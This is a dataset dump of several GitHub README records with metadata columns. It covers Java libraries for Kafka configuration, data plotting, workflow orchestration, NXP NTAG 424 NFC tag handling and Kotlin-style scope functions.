## Contributing
Contributions to improve the framework or add new features are welcome! If you find any issues or have suggestions for improvement, please open an issue or submit a pull request.

## License
NA
",1,0,1,0.0,"['keyword', 'driven', 'testing', 'framework', 'selenium', 'overview', 'feature', 'project', 'structure', 'setup', 'instruction', 'run', 'test', 'console', 'output', 'test', 'reporting', 'information', 'reporting', 'tool', 'use', 'project', 'allure', 'extentreport', 'contribute', 'license']","['project', 'test', 'reporting', 'keyword', 'driven']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
Trendyol/kafkathena-jakarta,master,"<div id=""top""></div>
<p align=""center"">
<img src=""docs/images/kafkathena_logo.png"" width=""250"" alt=""Kafkathena""/>
</p>

<h1 align=""center"">Smart, Fast, Customizable Consumer Configurations</h1>

<p align=""center"">
<a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/v/release/Trendyol/kafkathena-commons"" alt=""Release"" />
  </a>
<a href=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"">
    <img src=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"" alt=""License"" />
  </a>
  <a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/license/trendyol/baklava"" alt=""Spring Boot Version"" />
  </a>
</p>

<!-- ABOUT THE PROJECT -->
## About The Project

There are many great kafka configurations libraries; however, we didn't find one that really suited our needs so we created this enhanced one. Kafkathena provided by [Trendyol](https://github.com/trendyol)

Here's why:
* Your time should be focused on creating only consumer business. This library that solves a kafka configuration time complexity on your projects.
* Add as dependency, create consumer/producer configs, create consumer class and go!

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Features -->
## Features

* Config as a consumer and producers
* Consumer Acknowledge Customize Support
* Multiple Kafka Cluster Support
* Failover Error Topic and Custom Class Implementation
* Fixed Retry and Exponential Retry Support
* Consumer base ignore exceptions in failover
* Single Error Topic With Multiple Consumers
* Single Error Topic With Header Key Listening
* Filtered Consume Message
* Seperated Consume and Error Cluster
* Avro/Protobuffer Deserializer Support
* Authentication Base Cluster Support
* Kafka Message Sender Utility
* Spring 2.x/3.x, JDK 11/17 Support

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Build With -->
### Built With

This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.

* [Spring Starter 3+]
* [Spring Kafka Starter]
* [Jdk 17]

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

This is an example of how you may give instructions on setting up your project locally.
To get a local copy up and running follow these simple example steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* Maven 3+
* Jdk 17

### Installation
1. Copy and paste this inside your pom.xml dependencies block.
```xml
<dependency>
  <groupId>com.trendyol</groupId>
  <artifactId>kafkathena-jakarta</artifactId>
  <version>RELEASE</version>
</dependency>
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- USAGE EXAMPLES -->
## Usage

1. Add kafkathena
1. Add $`\textcolor{red}{\text{@EnableKafkathena}}`$ annotation as a configuration on SpringBoot Application
2. Create kafkathena config.yml

```
kafkathena:
  shared-factory-props:
    producer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSProducerInterceptor""
    consumer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSConsumerInterceptor""
      autoStartup: true
      missingTopicAlertEnable: false
      concurrency: 1
      syncCommitTimeoutSecond: 5
      syncCommit: true
      batch: false
      ackMode: RECORD
    clusters:
      ""[confluent]"":
        servers: localhost:9092
    
  producers:
    default:
      cluster: confluent
      props:
        ""[batch.size]"": 16384
        ""[linger.ms]"": 0
        ""[buffer.memory]"": 33554432
        ""[key.serializer]"": org.apache.kafka.common.serialization.StringSerializer
        ""[value.serializer]"": org.springframework.kafka.support.serializer.JsonSerializer
        ""[acks]"": ""1""
        ""[request.timeout.ms]"": 30000
  consumers:
    ""[consumer-one]"":
      type: JSON # AVRO/PROTO/JSON it can be empty
      topic: kafkathena.topic.one
      factory-bean-name: consumerOneKafkaListenerContainerFactory
      data-class: com.trendyol.kafkathena.demo.model.ConsumerOneMessage
      error-producer-name: default
      cluster: confluent
      filter-header:
        error-producer-filter-key: one-filter
        consumer-filter-key: one-filter
      failover:
        error-topic: kafkathena.topic.error
        handler-bean-name: defaultConsumerFailoverHandler
      fixed-retry:
        retry-count: 1
        backoff-interval-millis: : 5000 #wait time for retry
      exponential-retry:
        retry-count: : 1
        multiplier: 2
        maxInterval: 5
        backoff-interval-millis: : 1000
      factory-props:
        auto-startup: : true
        missing-topic-alert-enable: : false
        concurrency: 1
        sync-commit-timeout-second: : 5
        sync-commit: : true
        ack-mode: : RECORD
        interceptor-class-path: : com.trendyol.kafkathena.demo.interceptor.KafkaConsumerInterceptor
      props:
        ""[group.id]"": kafkathena.topicOneGroup
        ""[value.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.value.delegate.class]"": org.springframework.kafka.support.serializer.JsonDeserializer
        ""[key.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.key.delegate.class]"": org.apache.kafka.common.serialization.StringDeserializer
        ""[max.poll.records]"": 100
        ""[max.poll.interval.ms]"": 300000
        ""[session.timeout.ms]"": 300000
        ""[heartbeat.interval.ms]"": 3000
        ""[enable.auto.commit]"": true
        ""[auto.offset.reset]"": earliest
        ""[fetch.max.bytes]"": 52428800
        ""[fetch.max.wait.ms]"": 500
```
```
@Component
@DependsOnKafkathena
public class ConsumerOne {

    @KafkaListener(
            topics = ""${kafkathena.consumers[consumer-one].topic}"",
            groupId = ""${kafkathena.consumers[consumer-one].props[group.id]}"",
            containerFactory = ""${kafkathena.consumers[consumer-one].factory-bean-name}""
    )
    public void consume(@Payload ConsumerOneMessage message) {

    }
}
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

",1,0,1,0.0,"['about', 'the', 'project', 'feature', 'build', 'with', 'get', 'start', 'prerequisite', 'installation', 'usage', 'empty']","['about', 'the', 'project', 'feature', 'build']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:versions-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,0.0
Pradhisha-N/Data-Visualization,main,"# groot
Java Data Visualization project designed to make histogramming, plotting, and fitting accessible for Java users. 
## Features
- Histograms 1D/2D
- Functions 
- GraphErrors 
- Fitting routines using Minuit
- GUI tools for easily editing plot attributes and for fitting

# Examples
Try out the [demo jar](https://github.com/gavalian/groot/raw/master/jars/GrootDemo.jar) and check out the examples on our [Wiki](https://github.com/gavalian/groot/wiki ""GROOT Wiki""). 
To run the example: Simply double click on the jar if you're a mac user, or if you're a linux user run ```java -jar GrootDemo.jar```

<img src=""https://github.com/gavalian/groot/blob/master/images/multipad.png"" width=""800"">
<img src=""https://github.com/gavalian/groot/blob/master/images/histogram2d_demo.png"" width=""400"">
<img src=""https://github.com/gavalian/groot/blob/master/images/copyPaste.png"" width=""400"">
<img src=""https://github.com/gavalian/groot/blob/master/images/totalcs_ppbar.png"" width=""800"">

# groot 4
groot is getting an updated plotting package. Many improvements with plotting and new features.
This version (version=4) has many improvements allowing to produce article and presentation 
ready figures, supports PDF and SVG output.

<img src=""https://github.com/gavalian/groot/blob/master/images/groot4_example_1.png"" width=""800"">

In new version there are few new graph types, commonly used in analysis. Here is an example of Bar graph.

<img src=""https://github.com/gavalian/groot/blob/master/images/bar_graph_example.png"" width=""800"">

New canvas styles are imeplemented with preset configuration for plotting related plots.

<img src=""https://github.com/gavalian/groot/blob/master/images/multiplot_example.png"" width=""800"">

# Installation
Simply add this [library jar](https://github.com/gavalian/groot/raw/master/jars/) to your build path in an IDE.

# Requirements
Java 1.8 or greater

# Documentation
Check out our [Wiki](https://github.com/gavalian/groot/wiki ""GROOT Wiki"")!

# Feature requests and contributions
One of the best ways to contribute is to give us feature requests and bug reports on the [issues page](https://github.com/gavalian/groot/issues ""GROOT Issues page"")! 
",0,0,1,0.0,"['groot', 'feature', 'example', 'groot', 'installation', 'requirement', 'documentation', 'feature', 'request', 'contribution']","['groot', 'feature', 'example', 'installation', 'requirement']",1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
mytang0/brook,main,"# Brook

Brook is an orchestration engine, supports microservices and in-app logic (embedded use) orchestration. With the embedded mode, users can effortlessly build their own workflow orchestration engine.

## Getting started

In order to maximize the lightweight nature of the Brook engine, a deliberate separation is made between its core components (which depend solely on a few essential toolkits) and the middleware extensions using SPI (Service Provider Interface). Consequently, regardless of the application implementation framework, one can seamlessly rely on the engine JAR and initialize the relevant instances.

### Maven dependency

Specify the version appropriate for the project, see [releases](https://github.com/mytang0/brook/releases).
```xml
<properties>
    <dubbo.version>...</dubbo.version>
</properties>
```

#### Not using Spring

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-engine</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

#### Springboot (recommend)

```xml
<dependencies>
    <dependency>
        <groupId>xyz.mytang0.brook</groupId>
        <artifactId>>brook-spring-boot-starter</artifactId>
        <version>${brook.version}</version>
    </dependency>
</dependencies>
```

### Demo

After cloning the repository, the demo is located in the brook-demo module.
The definition of the testing process is located at 'resources/META-INF/flows'.

## Contributing

Brook welcomes anyone that wants to help out in any way, whether that includes reporting problems, helping with documentation, or contributing code changes to fix bugs, add tests, or implement new features. You can report problems to request features in the [GitHub Issues](https://github.com/mytang0/brook/issues).

### Code Contribute

- Left comment under the issue that you want to take.
- Fork Brook project to your GitHub repositories.
- Clone and compile your Brook project.
```bash
git clone https://github.com/your_name/brook.git
cd brook
mvn clean install -DskipTests
```
- Check to a new branch and start your work.
```bash
git checkout -b my_feature
```
- Push your branch to your github.
```bash
git push origin my_feature
```
- Create a new PR to https://github.com/mytang0/brook/pulls .",1,0,7,9.0,"['brook', 'get', 'start', 'maven', 'dependency', 'not', 'use', 'spring', 'springboot', 'recommend', 'demo', 'contribute', 'code', 'contribute']","['contribute', 'brook', 'get', 'start', 'maven']",24.0,"[kr.motd.maven:os-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.central:central-publishing-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,13.0,11.0
johnnyb/ntag424-java,main,"# NXP NTAG 424 DNA Library

NOTE - I consider the 1.0.X series to be ""still in development"" and breaking changes can occur at any time.
1.1.0 will be the first ""stable"" release.
This is due to a combination of factors, mostly centered around my inexperience with Java packaging and trying to get something to ""just work"".

This library is meant to help with handling the NXP NTAG 424 DNA chip.
Note that the library itself is completely hardware agnostic, and requires adding in a ""transceiver"" to manage the NFC hardware details.
See more about that in the Usage section.

Note that this is very much a work-in-progress and you should expect things to be moved around and renamed quite a bit for the time being.
The current API should not be considered stable.

This library is primarily based on the NXP document `NT4H2421Gx`, available [here](https://www.nxp.com/docs/en/data-sheet/NT4H2421Gx.pdf).
Page numbers (often referenced in the code) are from revision 3.0.

Note that this library was built almost entirely from the referenced documents.
I have no real experience with NFC, so I really don't know what is specific to this chip, to NXP generally, or to some other standard.
If you have suggestions on how to refactor this to support more NFC tags, I'm certainly open to it.

Note that there is a companion library for reading SUN messages that this chip can generate [here](https://github.com/johnnyb/nfc-sun-decoder).

Other important documents to read:

* Dna 424 Application Notes and hints, [NXP AN12196](https://www.nxp.com/docs/en/application-note/AN12196.pdf)
* Dna 424 LRP Mode Application Notes and hints, [NXP AN12321](https://www.nxp.com/docs/en/application-note/AN12321.pdf)

## Building

This library is built with Maven.  To build, just do:

```
mvn clean install
```

And it will produce a JAR file named `target/ntag424-VERSION.jar`. 

## Installing

To install, just copy the JAR built in the previous section into your JAR folder.  
For an Android project, this is usually in the `app/libs` directory.

## Example Android project

The `examples` directory has an Android project that uses this library.  It contains a built jar, but, if it ineeds updating, you can run `./copyjar.sh` out of that directory after doing an `mvn clean install` in the main directory to copy the new version in.

## Usage

The intended usage of this library is within an Android project, though it is written so that it could be used with non-Android NFC hardware.
Basic information about NFC tag reading in Android is available [here](https://developer.android.com/develop/connectivity/nfc/nfc).
Assuming that you have discovered a tag through an Intent (named `tagIntent` in the code below), you can use the library as follows:

```
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import net.bplearning.ntag424.Constants;
import net.bplearning.ntag424.DnaCommunicator;
import net.bplearning.ntag424.command.GetCardUid;
import net.bplearning.ntag424.encryptionmode.AESEncryptionMode;


...


Tag tag = tagIntent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
IsoDep iso = IsoDep.get(tag);
new Thread(() -> {
	try {
		iso.connect();

		// Connect the library to the Android tag transceiver
		DnaCommunicator communicator = new DnaCommunicator();
		communicator.setTransceiver((bytesToSend) -> iso.transceive(bytesToSend));

		// This is required to use the functionality of the chip.  It's a weird NFC thing.
		IsoSelectFile.run(communicator, IsoSelectFile.SELECT_MODE_BY_FILE_IDENTIFIER, Constants.DF_FILE_ID);

		// Try to authenticate with the factory key and start an encrypted session
		if(AESEncryptionMode.authenticateEV2(communicator, 0, Constants.FACTORY_KEY)) {
			// Run an encrypted command to get the Card UID
			byte[] cardUid = GetCardUid.run(communicator);
		} else {
			// Failed to authenticate
		}
	} catch(IOException e) {
		// Always expect IOExceptions - they can happen even from someone not holding the
		// tag in place long enough.
	}	
}).start();

```

The way the code works is that it is split into four basic parts:

1. The main DnaCommunicator class which handles packaging the commands for the communication channel, including encrypted session management.
2. Individual classes which each roughly correspond to a command in the spec.  These usually have one or more static methods named `run` which perform the task.  The first argument is always the DnaCommunicator object.  This was so that commands could be easily added without junking up the main DnaCommunicator class.  These currently reside in the `net.bplearning.ntag424.command` package.
3. Encryption mode classes.  These classes handle the actual encryption and MAC processing, with a static method that can be run to initiate the session.
4. Utility functions and constants.

## LRP Encryption

This library supports the LRP (leakage-resistant primitive) encryption mode.
However, you have to configure the tags to use LRP, and then, once they are in LRP mode, they *cannot* be switched back to AES mode.
To set a tag to LRP mode, authenticate (as shown above), and then do:
```
import net.bplearning.ntag424.command.SetCapabilities;

SetCapabilities.run(communicator, true);
```

After doing that, AES encryption mode will NOT be available on the tag, and you CANNOT get it back.
you will then need to change out your authentication function from `AESEncryptionMode.authenticateEV2` to `LRPEncryptionMode.authenticateLRP`.

The LRP encryption is based on the NXP Document `AN12304`, available [here](https://www.nxp.com/docs/en/application-note/AN12304.pdf).
Page numbers are from version 1.1.

Also note that there is a Go implementation of LRP available [here](https://github.com/johnnyb/gocrypto).

## Secure Dynamic Messaging (SDM)

This library has some utility functions for performing SDM and generating SUN (Secure Unique NFC) messages.

This is currently in flux, but the way it works right now is as follows:

1. Create an SDMSettings object
2. Set the file permissions on the SDMSettings object.
3. Create an NdefTemplateMaster object and set whether LRP is in use.
4. Create a structured URL using the components for SDM.
5. Pass the URL and the SDMSettings to the NdefTemplateMaster object and get the resulting file data.
6. Write the file data to the NDEF file.
7. Change the file settings on the NDEF file to use the new SDMSettings object.

Step 3 will probably be removed at some point and this functionality will be integrated into another class.  Probably.
We may also incorporate some special commands to make some of this easier.

Here is some example code:

```
// Generate a new SDMSettings object and set the access permissions
SDMSettings sdmSettings = new SDMSettings();
sdmSettings.sdmMetaReadPerm = Constants.ACCESS_EVERYONE; // Set to a key to get encrypted PICC data
sdmSettings.sdmFileReadPerm = Constants.ACCESS_KEY2;     // Used to create the MAC and Encrypt FileData
sdmSettings.sdmReadCounterRetrievalPerm = Constants.ACCESS_NONE; // Not sure what this is for

// Create the NDEF record and make appropriate updates to SDMSettings
byte[] ndefRecord = master.generateNdefTemplateFromUrlString(""https://www.example.com/{UID}{COUNTER}/{MAC}"", sdmSettings);

// Write the data to the NDEF file
WriteData.run(communicator, Constants.NDEF_FILE_NUMBER, ndefRecord);

// Get the existing file settings:
FileSettings ndeffs = GetFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER);

// Make any modifications you would like to those settings/permissions
// ...

// Set the SDMSettings to the newly-created sdmSettings object
ndeffs.sdmSettings = sdmSettings;

// Make changes to the file
ChangeFileSettings.run(communicator, Constants.NDEF_FILE_NUMBER, ndeffs);
```

After this, your tag should be using SDM.  Note that the offsets will auto-expand to match the requirements of the template.
Template pieces include:

* `{UID}`: Mirror the UID here
* `{COUNTER}`: Mirror the SDM Read Counter here
* `{PICC}`: Put the encrypted PICC data here (encrypted with sdmMetaReadPerm key).  If set, be sure to set usesLrp on the NDefMasterTemplate object (affects the size of the PICC data).
* `{FILE}`: Put the encrypted secret data here (encrypted with sdmFileReadPerm key).  If set, be sure to set the fileDataLength of the NdefMasterTemplate object.
* `{MAC}`: Put the MAC data here.
* `^`: If set, this is the start of the location that will be used for MAC calculation.  If unset, it just becomes the location of the start of the MAC, indicating to only MAC the PICC data.  Or, if there is encrypted file data, it is set to be the start of the encrypted file data.

Personally, I like to use `{UID}{COUNTER}` and `{MAC}` rather than `{PICC}` because, if there is a connection issue with the Internet, I at least know what UID my tag was wanting to be, even if I can't fully validate it.

## SDM Validation

You can also use this library on the ""other side"" to validate SDM messages and read their contents.
For unencrypted PICC data, do the following:

```
PiccData picc = new PiccData(uid, readCounter, usesLrp);
```

If the UID is not mirrored, set it to null.  If the readCounter is not mirrored, set it to 0.

For encrypted PICC data, do the following:

```
PiccData picc = PiccData.decodeFromEncryptedBytes(encryptedBytes, key, usesLrp);
```

Note that the key for decrypting the PICC data can be a different key from validating the MAC / decrypting the file data.
Therefore, you have to set this key with `setMacFileKey()`.

Then, you can validate the MAC (use an empty byte array for the message if there isn't one):

```
picc.setMacFileKey(macFileKey);
picc.performShortMac(new byte[0]); // MAC on PICC-only data
picc.decryptFileData(filedata);
```

## SDM Setups

This section describes some common ways to configure SDM.
SDM has a lot of options, so just picking a starting point is sometimes difficult.

Personally, my preferred method is to create an NDEF URL that looks like this: ""https://www.example.com/tagread/{UID}{COUNTER}/{MAC}""

Basically, this puts the UID and counter in plaintext.
This means that if something is scanning but is not connected to the Internet, it can in fact read the UID off of the card from the URL.
But, if you are connected to the Internet, it can do additional validation.

For general purposes, I personally recommend any additional information be stored on the server and retrieved rather than encoded into the card.
It just makes life easier, because then you just have an NDEF record to deal with, and you can easily link the data to the card after-the-fact with minimal tooling.
Basically, you have a card programmer, and, after the cards are programmed with your keys/URL, you can use other devices to tie those cards to something, and they don't need your encryption keys to do it.


## Key diversification

Key diversification allows you to have a different key on each device so that if someone were to steal the keys from the tag (which is itself a very difficult thing to do) it would not help them to know the keys for the other tags.

On the other hand, for key diversification to work, you need to know *which* key is on *which* device.
The standard way of doing this is by having a single master key which gets diversified by doing a CMAC using the master key with a combination of the tag's UID and some additional data known as the ""diversification data"" (this is used mostly to make sure the data is long enough to get a good CMAC).

Generally, the diversification data is constructed as follows.  
First, decide on a ""system identifier"".
This is a few bytes which is often an ASCII-ized version of your application name.
If your application is named ""foo"" then your system identifier is `new byte[] {0x66, 0x6f, 0x6f}`.
Then, use the `KeyInfo` class to construct your key.
Note that there is also an ""application identifier"" available.
I am not clear what that is supposed to be, but the document this is based on (AN10922) uses the ""3-byte DESfire AID"" (0x3042F5) in its example, so that is the default here.

```
byte[] masterKey = new byte[]{ /* Your master key here */ };
KeyInfo keyInfo = new KeyInfo();
keyInfo.key = masterKey;
keyInfo.systemIdentifier = new byte[] {0x66, 0x6f, 0x6f};
keyInfo.diversifyKeys = true; 
byte[] cardKey = keyInfo.generateKeyForCardUid(uidBytes);
```

Note that usually the key that is used for encrypting PICC data (if any) is *not* diversified, because you need to know that key *before* you know the UID.
Then, once the UID is obtained, then that can be used to generate a UID-specific diversified key that is used for the file data encryption (if any) and the MAC (which is almost always used).

I think the general convention is to use App Key 2 for your non-diversified PICC encryption key, and then use App Key 3 for your diversified key.
Note, however, that your diversified key SHOULD NOT be just a diversification of your non-diversified key.
It should be based on a *separate* master key.
Otherwise, if someone were to decode one of your tags, obtaining the key would give them all the information they needed to generate and fake diversified keys.
Keeping the master key for your diversified keys secret is an absolute imperative for the system to work.

## Generating Keys

An easy way to generate a key is with the following command:

```
head -c 16 /dev/random|xxd -p
```
",0,7,3,1.0,"['nxp', 'ntag', 'dna', 'library', 'building', 'instal', 'example', 'android', 'project', 'usage', 'lrp', 'encryption', 'secure', 'dynamic', 'messaging', 'sdm', 'sdm', 'validation', 'sdm', 'setup', 'key', 'diversification', 'generate', 'key']","['sdm', 'key', 'nxp', 'ntag', 'dna']",1.0,"[maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin]",0.0,1.0,0.0
evpl/jkscope,main,"# JKScope

[![Maven Central](https://img.shields.io/maven-central/v/com.plugatar.jkscope/jkscope)](https://central.sonatype.com/artifact/com.plugatar.jkscope/jkscope)
[![Javadoc](https://javadoc.io/badge2/com.plugatar.jkscope/jkscope/javadoc.svg?color=blue)](https://javadoc.io/doc/com.plugatar.jkscope/jkscope)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Mentioned in Awesome Java](https://awesome.re/mentioned-badge.svg)](https://github.com/akullpp/awesome-java)

[![GitHub Actions Workflow Status](https://img.shields.io/github/actions/workflow/status/evpl/jkscope/build.yml?branch=main)](https://github.com/evpl/jkscope)
[![Lines](https://sloc.xyz/github/evpl/jkscope/?category=lines)](https://github.com/evpl/jkscope)
[![Code lines](https://sloc.xyz/github/evpl/jkscope/?category=code)](https://github.com/evpl/jkscope)
[![Hits of Code](https://hitsofcode.com/github/evpl/jkscope?branch=main)](https://hitsofcode.com/github/evpl/jkscope/view?branch=main)

Java scope functions inspired by Kotlin

## Table of Contents

* [Motivation](#motivation)
* [How to use](#how-to-use)
* [Docs](#docs)
  * [JKScope interface methods](#jkscope-interface-methods)
    * [`letIt` and `also`](#letit-and-also)
    * [`takeIf` and `takeUnless`](#takeif-and-takeunless)
    * [`letOut`](#letout)
    * [`letOpt`](#letopt)
  * [JKScope static methods](#jkscope-static-methods)
    * [`run`, `runCatching` and `runRec`](#run-runcatching-and-runrec)
    * [`with`, `withInt`, `withLong`, `withDouble` and `withResource`](#with-withint-withlong-withdouble-and-withresource)
    * [`let` variations](#let-variations)
    * [`opt` and `optNonNull`](#opt-and-optnonnull)
    * [`lazy` and `lazyOfValue`](#lazy-and-lazyofvalue)
  * [`Opt` object](#opt-object)
  * [`Lazy` object](#lazy-object)
  * [Unchecked functions](#unchecked-functions)
  * [Examples](#examples)
    * [Collection initialization](#collection-initialization)
    * [Argument in a method chain](#argument-in-a-method-chain)
    * [Nth Fibonacci number](#nth-fibonacci-number)
    * [Method argument processing](#method-argument-processing)
    * [Safe resources](#safe-resources)

## Motivation

Inspired by the [Kotlin scope function](https://kotlinlang.org/docs/scope-functions.html) I want to make my Java code
more structured and readable.

## How to use

Java 8+ version required. The library has no dependencies. All you need is this (get the latest
version [here](https://github.com/evpl/jkscope/releases)).

Maven:

```xml

<dependency>
  <groupId>com.plugatar.jkscope</groupId>
  <artifactId>jkscope</artifactId>
  <version>2.3</version>
  <scope>compile</scope>
</dependency>
```

Gradle:

```groovy
dependencies {
  implementation 'com.plugatar.jkscope:jkscope:2.3'
}
```

## Docs

### JKScope interface methods

You need to implement `JKScope` interface to use these methods.

```
class MyObject implements JKScope<MyObject> { }
```

#### `letIt` and `also`

Both methods are the same and differ in the name only. Methods perform the function block on this object and return this
object.

```
MyDTO myDTO = new MyDTO().letIt(it -> {
  it.setProperty(""value"");
  it.setAnother(""another value"");
});

MyResource myResource = new MyResource().also(it -> it.init());
```

#### `takeIf` and `takeUnless`

`takeIf` method performs the function block on this object and returns `Opt` monad of this object if the condition is
met, or it returns empty `Opt` instance if the condition is not met. And `takeUnless` method has reverse logic.

```
new MyObject().takeIf(it -> it.getInt() > 10).takeUnless(it -> it.getInt() > 20).letIt(it -> System.out.println(it));
```

#### `letOut`

`letOut` method performs given function block on this object and returns result.

```
Integer value = new MyObject().letOut(it -> it.getInt());
```

#### `letOpt`

`letOpt` method performs given function block on this object and returns `Opt` monad of result.

```
new MyObject().letOpt(it -> it.getInt()).takeIf(it -> it > 10).letIt(it -> System.out.println(it));
```

### JKScope static methods

Import static methods you need or import them all at once.

```
import static com.plugatar.jkscope.JKScope.*;
```

#### `run`, `runCatching` and `runRec`

`run` just runs given function block, `runCatching` runs ignore any Throwable, `runRec` runs function block allowing
yourself to be called recursively.

`run` method simply runs given function block, `runCatching` runs ignore any thrown Throwable, `runRec` runs function
block, allowing itself to be called recursively.

```
run(() -> {
  System.out.println(""Hi"");
});

runCatching(() -> {
  System.out.println(""Hi"");
});

runRec(func -> {
  if (new Random().nextInt(0, 100) == 50) {
    func.run();
  }
});
```

#### `with`, `withInt`, `withLong`, `withDouble` and `withResource`

These methods perform given function block on given values.

```
with(value, it -> {
  System.out.println(value);
});

with(value1, value2, (v1, v2) -> {
  System.out.println(v1);
  System.out.println(v2);
});
```

`withResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `let` variations

`let`, `letInt`, `letLong` and `letDouble` returns result of function block.

```
String value = let(() -> {
  //...
  return ""val"";
});
```

`let`, `letInt`, `letLong` and `letDouble` methods can also receive a value, process it using a function block, and
return that value.

```
String value = let(""val"", it -> {
  System.out.println(it);
});
```

`letRec`, `letIntRec`, `letLongRec` and `letDoubleRec` accept initial value and allow you to process it recursively
returning the result.

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

`letWith`, `letIntWith`, `letLongWith`, `letDoubleWith` methods accept values and returning the result of function
block.

```
int value = letWith(""42"", it -> Integer.valueOf(it));
```

`letWithResource` method does the same thing, but with a `AutoCloseable` resource and closes this resource.

#### `opt` and `optNonNull`

`opt` returns `Opt` instance of given value, `optNonNull` returns `Opt` instance of given value of given value or
empty `Opt` instance if given value is null.

```
opt(value).takeNonNull().takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));

optNonNull(value).takeUnless(it -> it.isEmpty()).takeIf(it -> it.length() < 100).letIt(it -> System.out.println(it));
```

#### `lazy` and `lazyOfValue`

`lazy` returns `Lazy` instance with given initializer. `lazyOfValue` returns `Lazy` instance of given value.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### `Opt` object

The `Opt` monad is similar in meaning to Java `Optional`, but allows the null value.

`Opt` monad contains some `Optional` methods and scope functions methods.

```
String result = Opt.of(value).takeIf(it -> it.length() > 10).orElse("""");

String result = Opt.of(value).takeNonNull().orElseGet(() -> """");

String result = Opt.of(value).takeIf(it -> it.length() > 10).orElseThrow(() -> new IllegalArgumentException());
```

### `Lazy` object

`Lazy` represents a value with lazy initialization.

```
Lazy<String> lazy = lazy(() -> {
  //...
  return ""value"";
});

Lazy<String> lazyOfValue = lazyOfValue(""value"");
```

### Unchecked functions

All presented functions allow you to not process checked exceptions.

```
public static void main(String[] args) {
  URI uri = let(() -> new URI(""abc""));
}
```

### Examples

#### Collection initialization

```
Map<String, Integer> map = let(new HashMap<>(), it -> {
  it.put(""val1"", 1);
  it.put(""val2"", 2);
});

List<String> list = let(new ArrayList<>(), it -> {
  it.add(""val1"");
  it.add(""val2"");
});
```

#### Argument in a method chain

```
new MyBuilder()
  .setFirst(""first"")
  .setSecond(""second"")
  .setThird(let(() -> {
    //...
    return ""third"";
  }))
  .setFourth(""fourth"")
  .build()
```

#### Nth Fibonacci number

```
int value = letIntRec(10, (n, func) -> {
  if (n <= 1) {
    return 1;
  } else {
    return n * func.apply(n - 1);
  }
});
```

#### Method argument processing

```
public static String checkNonNullNonEmptyStr(String value) {
  return opt(value)
    .takeNonNull().throwIfEmpty(NullPointerException::new)
    .takeUnless(String::isEmpty).throwIfEmpty(IllegalArgumentException::new)
    .get();
}
```

#### Safe resources

```
class MyResource implements AutoCloseable {
  //...
}

withResource(new MyResource(), it -> {
  //...
});
```
